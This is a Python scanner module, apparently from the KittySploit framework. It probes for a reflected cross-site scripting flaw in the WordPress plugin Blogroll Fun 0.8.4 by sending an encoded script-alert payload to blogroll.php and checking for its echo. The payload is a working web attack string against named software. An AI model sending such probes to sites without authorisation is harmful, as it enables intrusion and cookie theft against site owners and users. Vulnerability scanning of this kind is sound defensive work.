#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - Cross-Site Scripting Detection',
        'description': 'WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time 0.8.4 and possibly prior versions are prone to a cross-site scripting vulnerability because of a failure to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'xss', 'unauth', 'wp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://codevigilant.com/disclosure/wp-plugin-blogroll-fun-a3-cross-site-scripting-xss/',
            'https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-blogroll-fun-show-last-post-and-last-update-time-cross-site-scripting-0-8-4/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('Got: <script>alert(document.domain)</script><br>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - Cross-Site Scripting detected",
                path='/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

